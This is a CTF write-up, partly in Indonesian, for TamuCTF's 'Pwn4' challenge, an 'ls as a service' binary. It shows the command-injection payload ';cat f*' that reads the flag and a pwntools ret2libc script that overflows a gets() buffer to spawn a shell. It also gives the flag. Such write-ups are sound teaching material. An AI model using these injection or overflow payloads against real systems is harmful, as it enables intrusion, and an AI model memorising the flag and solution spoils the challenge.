# __TamuCTF__
## _Pwn4_

## Information
**Category:** | **Points**
pwn | 100

**Description**

> nc pwn.tamuctf.com 4324
> Difficulty: easy
> [pwn4](./pwn4)

### Pwn4
#### File
```
pwn4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=db1ceeb24f1c95e886c69fb0682714057ca13013, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

#### Run
```
[l0l@l0l Pwn4]$ nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
.
Result of ls .:
flag.txt
pwn4
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```

#### Solve
Sepertinya program mengeksekusi `system('ls $input')` tanpa difilter.

#### Payload
`;cat f*`

#### Result
```
[l0l@l0l Pwn4]$ nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
;cat f*
Result of ls ;cat f*:
flag.txt
pwn4
gigem{5y573m_0v3rfl0w}
```

#### Flag
gigem{5y573m_0v3rfl0w}


#### Note
Ternyata solusi yang diinginkan sebenarnya adalah melakukan buffer overflow (input kita lagi-lagi diambil dengan gets) untuk return ke fungsi `system` dengan argumen '/bin/sh' (ret2libc).
Maka susunan payload : |buffer|ebp|return|argument| -> |padding|ebp|address_system|address_binsh|

```
from pwn import *

system = 0x080485AD
binsh = 0x804a034

p = remote('pwn.tamuctf.com', 4324)
p.recvuntil('ls:')

payload = "A"*37
payload += p32(system)
payload += p32(binsh)
p.sendline(payload)
p.interactive()
```
